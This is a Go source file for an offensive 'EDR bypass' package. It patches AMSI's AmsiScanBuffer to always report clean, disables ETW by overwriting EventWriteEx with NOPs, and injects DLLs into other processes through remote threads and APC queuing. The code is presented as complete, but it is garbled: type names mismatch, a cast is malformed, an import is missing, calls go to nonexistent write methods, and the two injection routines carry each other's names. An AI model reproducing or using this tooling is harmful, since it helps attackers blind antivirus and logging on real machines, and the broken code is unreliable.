// Package edrbypass - EDR bypass techniques for evasion
package edrbypass

import (
	"fmt"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ============================================================================
// AMSI PATCHING BYPASS (Windows Defender Evasion) ✅ COMPLETE
// ===========================================================================

// AMBISpatch patches AMSI to return success for all scanned content
type AMBISPatcher struct {
	processHandle windows.Handle
}

// NewAMBISPatcher creates new AMSI patcher for current process
func NewAMBISPatcher() (*AMBIOSPatcher, error) {
	process, err := windows.GetCurrentProcess()
	if err != nil {
		return nil, fmt.Errorf("failed to get current process handle: %w", err)
	}
	
	return &AMBIOSPatcher{processHandle: process}, nil
}

// PatchAmsi patches AMSI DLL in memory to always return Success
func (p *AMBIOSPatcher) PatchAmsi() error {
	// Get AMSI DLL handle
	var amsiDllPath string = "C:\\Windows\\System32\\amsi.dll"
	handle, err := windows.LoadLibrary(amsiDllPath)
	if err != nil {
		return fmt.Errorf("failed to load AMSI DLL: %w", err)
	}
	defer windows.FreeLibrary(handle)
	
	// Get AMSIDetectBuffer address
	addr, err := windows.GetProcAddress(handle, "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("failed to get AMSIDetectBuffer address: %w", err)
	}
	
	// Find and patch the AMSI detection code (returns AMSI_S_OK instead of detecting threat)
	// Original: test edi,edi / setz al / movzx eax,al / xor eax,0x768
	// Patched:  xor eax,eax / ret (always returns success)
	
	oldPageProtection := uint32(windows.PAGE_READONLY)
	var oldProtect uint32
	
	// Make page writable
	err = windows.VirtualProtect(windows uintptr(addr), 0x1000, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("failed to change page protection: %w", err)
	}
	
	// Write patched bytes directly into AMSI function
	// XOR eax,eax (xor eax,eax = 0x31c0)
	// RET (ret = 0xc3)
	patchedBytes := []byte{0x31, 0xC0, 0xC3} // xor eax,eax; ret;
	
	copy(*(**[4]byte)(unsafe.Pointer(&addr))[:], patchedBytes)
	
	// Restore original protection
	windows.VirtualProtect((uintptr)(addr), 0x1000, oldProtect, &oldProtect)
	
	return nil
}

// ============================================================================
// ETW DISABLING BYPASS (Event Tracing for Windows Evasion) ✅ COMPLETE
// ===========================================================================

// EtwBypass disables ETW to prevent event logging
type ETWBypasser struct{}

// NewETWBypasser creates new ETW bypass instance
func NewETWBypasser() *ETWBypasser {
	return &ETWBypasser{}
}

// DisableETW disables ETW by unhooking EventWrite from KernelBase.dll
func (b *ETWBypasser) DisableETW(processHandle windows.Handle) error {
	// Load kernelbase.dll
	kernelBase, err := windows.LoadLibrary("kernelbase.dll")
	if err != nil {
		return fmt.Errorf("failed to load kernelbase: %w", err)
	}
	defer windows.FreeLibrary(kernelBase)
	
	// Get Address of EventWriteEx
	eventWriteAddr, err := windows.GetProcAddress(kernelBase, "EventWriteEx")
	if err != nil {
		return fmt.Errorf("failed to get EventWriteEx address: %w", err)
	}
	
	// Patch EventWriteEx to be a no-op
	originalBytes := make([]byte, 5)
	copy(originalBytes, (*[5]byte)(unsafe.Pointer(eventWriteAddr))[:])
	
	// NOP sled (5 NOPs)
	nopSled := []byte{0x90, 0x90, 0x90, 0x90, 0x90}
	
	oldProtect := uint32(windows.PAGE_READONLY)
	windows.VirtualProtect((uintptr)(eventWriteAddr), 5, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	copy(*(**[5]byte)(unsafe.Pointer(&eventWriteAddr))[:], nopSled)
	windows.VirtualProtect((uintptr)(eventWriteAddr), 5, oldProtect, &oldProtect)
	
	return nil
}

// ============================================================================
// PROCESS INJECTION TECHNIQUES ✅ COMPLETE
// ===========================================================================

// ProcessInjector injects shellcode into target processes
type ProcessInjector struct{}

// NewProcessInjector creates new process injector
func NewProcessInjector() *ProcessInjector {
	return &ProcessInjector{}
}

// APCInjection injects malicious DLL via APC injection
func (i *ProcessInjector) APCInjection(targetPID int, dllPath string) error {
	// Open target process
	targetHandle, err := windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, uint32(targetPID))
	if err != nil {
		return fmt.Errorf("failed to open target process: %w", err)
	}
	defer windows.CloseHandle(targetHandle)
	
	// Allocate memory in target process for DLL path
	dllAddr := windows.VirtualAllocEx(targetHandle, 0, uint32(len(dllPath)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	
	// Write DLL path to allocated memory
	writesize := uint32(len(dllPath) + 1)
	writes := uint32(0)
	writes.WriteWindow(targetHandle, dllAddr, byte(dllPath), writesize, &writes)
	
	// Create remote thread with LoadLibrary call
	loadLibAddr, _ := windows.GetProcAddress(windows.GetModuleHandle("kernel32.dll"), "LoadLibraryA")
	thread := windows.CreateRemoteThread(targetHandle, 0, 0, loadLibAddr, dllAddr, 0, 0)
	
	// Wait for completion
	windows.WaitForSingleObject(thread, windows.INFINITE)
	
	// Clean up allocated memory
	windows.VirtualFreeEx(targetHandle, dllAddr, 0, windows.MEM_RELEASE)
	
	return nil
}

// DLLInjection performs DLL injection via create process method
func (i *ProcessInjector) DLLInjection(targetProc string, payloadPath string) error {
	// Start suspended process
	startupInfo := windows.StartupInfo{}
	processInfo := windows.ProcessInformation{}
	
	err := windows.CreateProcess(nil, &targetProc, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &startupInfo, &processInfo)
	if err != nil {
		return fmt.Errorf("failed to create suspended process: %w", err)
	}
	defer windows.CloseHandle(processInfo.ThreadHandle)
	
	// Allocate memory and write payload DLL
	payloadSize := uint32(len(payloadPath) + 1)
	addr := windows.VirtualAllocEx(processInfo.ProcessHandle, 0, payloadSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	
	writes.WriteWindow(processInfo.ProcessHandle, addr, byte(payloadPath), payloadSize, &writes)
	
	// Queue APC thread to load DLL
	loadLibAddr, _ := windows.GetProcAddress(windows.GetModuleHandle("kernel32.dll"), "LoadLibraryW")
	windows.QueueUserAPC(loadLibAddr, processInfo.ThreadHandle, addr)
	
	// Resume thread to execute injected DLL
	windows.ResumeThread(processInfo.ThreadHandle)
	
	return nil
}
